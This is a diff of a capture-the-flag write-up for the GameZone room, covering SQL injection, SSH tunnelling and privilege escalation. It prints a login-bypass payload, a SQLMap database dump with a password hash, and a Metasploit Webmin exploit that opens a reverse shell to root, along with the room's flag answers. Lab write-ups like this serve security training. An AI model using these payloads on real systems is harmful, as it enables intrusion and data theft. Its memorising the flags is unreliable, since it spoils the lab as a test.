@@ -61,11 +61,7 @@ zsh: segmentation fault  sudo nmap -sC -sV -T4 -A -Pn -sS -n -O 10.10.183.87
 reverse img search /google img
 agent 47
 
-
-
-
 ```
-
 
 What is the name of the large cartoon avatar holding a sniper on the forum?
 Reverse Image Search
@@ -73,10 +69,7 @@ Reverse Image Search
 
 ###  Obtain access via SQLi 
 
-
 In this task you will understand more about SQL (structured query language) and how you can potentially manipulate queries to communicate with the database.
-
-
 
 SQL is a standard language for storing, editing and retrieving data in databases. A query can look like so:
 
@@ -85,10 +78,6 @@ SELECT * FROM users WHERE username = :username AND password := password
 In our GameZone machine, when you attempt to login, it will take your inputted values from your username and password, then insert them directly into the query above. If the query finds data, you'll be allowed to login otherwise it will display an error message.
 
 Here is a potential place of vulnerability, as you can input your username as another SQL query. This will take the query write, place and execute it.
-
-
-
-
 
 Lets use what we've learnt above, to manipulate the query and login without any legitimate credentials.
 
@@ -100,12 +89,6 @@ SELECT * FROM users WHERE username = admin AND password := ' or 1=1 -- -
 
 	The extra SQL we inputted as our password has changed the above query to break the initial query and proceed (with the admin user) if 1==1, then comment the rest of the query to stop it breaking.
 
-
-
-
-![[Pasted image 20220927173423.png]]
-
-
 GameZone doesn't have an admin user in the database, however you can still login without knowing any credentials using the inputted password data we used in the previous question.
 
 Use ' or 1=1 -- - as your username and leave the password blank.
@@ -113,25 +96,19 @@ Use ' or 1=1 -- - as your username and leave the password blank.
 When you've logged in, what page do you get redirected to?
 *portal.php*
 
-
 ### Using SQLMap 
 
 ![](https://i.imgur.com/S3tNhsc.png)
 
-
 SQLMap is a popular open-source, automatic SQL injection and database takeover tool. This comes pre-installed on all version of Kali Linux or can be manually downloaded and installed here.
 
 There are many different types of SQL injection (boolean/time based, etc..) and SQLMap automates the whole process trying different techniques.
-
-
 
 We're going to use SQLMap to dump the entire database for GameZone.
 
 Using the page we logged into earlier, we're going point SQLMap to the game review search feature.
 
 First we need to intercept a request made to the search feature using BurpSuite.
-
-
 
 ![](https://i.imgur.com/ox4wJVH.png)
 
@@ -146,8 +123,6 @@ Save this request into a text file. We can then pass this into SQLMap to use our
 ![](https://i.imgur.com/iiQ7g9t.png)
 
 SQLMap will now try different methods and identify the one thats vulnerable. Eventually, it will output the database.
-
-![[Pasted image 20220927175132.png]]
 
 ```
 ┌──(kali㉿kali)-[~]
@@ -323,10 +298,7 @@ Table: post
 
 [*] ending @ 18:58:09 /2022-09-27/
 
-
-
 ```
-
 
 In the users table, what is the hashed password?
 *ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14*
@@ -388,13 +360,11 @@ Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)
 109 packages can be updated.
 68 updates are security updates.
 
-
 Last login: Fri Aug 16 17:52:04 2019 from 192.168.1.147
 agent47@gamezone:~$ ls
 user.txt
 agent47@gamezone:~$ cat user.txt
 649ac17b1480ac13ef1e4fa579dac95c
-
 
 ```
 
@@ -406,7 +376,6 @@ Now you have a password and username. Try SSH'ing onto the machine.
 What is the user flag?
 *649ac17b1480ac13ef1e4fa579dac95c*
 
-
 ### Exposing services with reverse SSH tunnels 
 
 ![](https://i.imgur.com/cYZsC8p.png)
@@ -416,8 +385,6 @@ Reverse SSH port forwarding specifies that the given port on the remote server h
 -L is a local tunnel (YOU <-- CLIENT). If a site was blocked, you can forward the traffic to a server you own and view it. For example, if imgur was blocked at work, you can do ssh -L 9000:imgur.com:80 user@example.com. Going to localhost:9000 on your machine, will load imgur traffic using your other server.
 
 -R is a remote tunnel (YOU --> CLIENT). You forward your traffic to the other server for others to view. Similar to the example above, but in reverse.
-
-
 
 We will use a tool called ss to investigate sockets running on a host.
 
@@ -456,11 +423,8 @@ udp        0      0 0.0.0.0:10000           0.0.0.0:*
 
 ```
 
-
 How many TCP sockets are running?
 *5*
-
-
 
 We can see that a service running on port 10000 is blocked via a firewall rule from the outside (we can see this from the IPtable list). However, Using an SSH Tunnel we can expose the port to us (locally)!
 
@@ -485,16 +449,12 @@ Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)
 109 packages can be updated.
 68 updates are security updates.
 
-
 Last login: Tue Sep 27 18:03:14 2022 from 10.11.81.220
 agent47@gamezone:~$
 
 http://127.0.0.1:10000/
 
-
 ```
-
-![[Pasted image 20220927180757.png]]
 
 What is the name of the exposed CMS?
 *Webmin*
@@ -523,8 +483,6 @@ What is the CMS version?
 *1.580*
 Any credentials you can make use of to login?
 
-
-
 ### Privilege Escalation with Metasploit 
 
 Using the CMS dashboard version, use Metasploit to find a payload to execute against the machine.
@@ -547,7 +505,6 @@ Matching Modules
    5  auxiliary/admin/webmin/edit_html_fileaccess    2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
    6  exploit/linux/http/webmin_backdoor             2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
 
-
 Interact with a module by name or index. For example info 6, use 6 or use exploit/linux/http/webmin_backdoor
 
 msf6 > use 0
@@ -568,7 +525,6 @@ Module options (exploit/unix/webapp/webmin_show_cgi_exec):
    USERNAME                   yes       Webmin Username
    VHOST                      no        HTTP server virtual host
 
-
 Payload options (cmd/unix/reverse):
 
    Name   Current Setting  Required  Description
@@ -576,13 +532,11 @@ Payload options (cmd/unix/reverse):
    LHOST                   yes       The listen address (an interface may be specified)
    LPORT  4444             yes       The listen port
 
-
 Exploit target:
 
    Id  Name
    --  ----
    0   Webmin 1.580
-
 
 msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set rhosts 127.0.0.1
 rhosts => 127.0.0.1
@@ -624,7 +578,6 @@ root
 cat /root/root.txt
 a4b945830144bdd71908d12d902adeee
 ```
-
 
 What is the root flag?
 
